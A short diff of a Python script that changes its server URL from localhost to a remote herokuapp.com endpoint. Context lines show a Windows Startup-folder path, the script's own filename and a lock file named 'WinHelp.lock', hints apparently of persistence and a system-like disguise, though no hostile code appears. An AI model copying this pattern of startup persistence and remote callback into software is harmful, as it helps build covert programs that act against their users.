@@ -23,7 +23,7 @@ win7_user_startup =\
     os.path.join(
         os.path.expanduser("~"),
         '\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-server_url = 'http://127.0.0.1:9292/json'
+server_url = 'https://tranquil-caverns-83807.herokuapp.com/json'
 user_home = os.path.expanduser("~\Desktop")
 myself = os.path.basename(sys.argv[0])
 lock_file = '{}'.format(os.path.join(os.path.expanduser('~'), 'WinHelp.lock'))
